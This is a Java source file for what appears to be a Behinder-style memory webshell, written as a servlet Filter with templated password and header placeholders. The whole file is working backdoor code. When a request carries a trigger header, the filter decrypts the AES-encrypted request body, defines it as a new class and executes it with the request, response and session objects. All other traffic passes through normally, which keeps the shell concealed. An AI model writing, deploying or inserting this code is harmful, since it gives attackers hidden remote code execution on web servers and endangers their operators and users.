package com.reajason.javaweb.memshell.shelltool.behinder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderFilter extends ClassLoader implements Filter {
    public String pass = "{{pass}}";
    public String headerName = "{{headerName}}";
    public String headerValue = "{{headerValue}}";

    @SuppressWarnings("all")
    public Class<?> g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public BehinderFilter() {
    }

    public BehinderFilter(ClassLoader c) {
        super(c);
    }

    @Override
    @SuppressWarnings("all")
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;

        try {
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpSession session = ((HttpServletRequest) servletRequest).getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", servletRequest);
                obj.put("response", response);
                obj.put("session", session);
                session.setAttribute("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                byte[] bytes = c.doFinal(base64Decode(servletRequest.getReader().readLine()));
                Object instance = (new BehinderFilter(this.getClass().getClassLoader())).g(bytes).newInstance();
                instance.equals(obj);
            } else {
                filterChain.doFilter(servletRequest, servletResponse);
            }
        } catch (Exception e) {
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
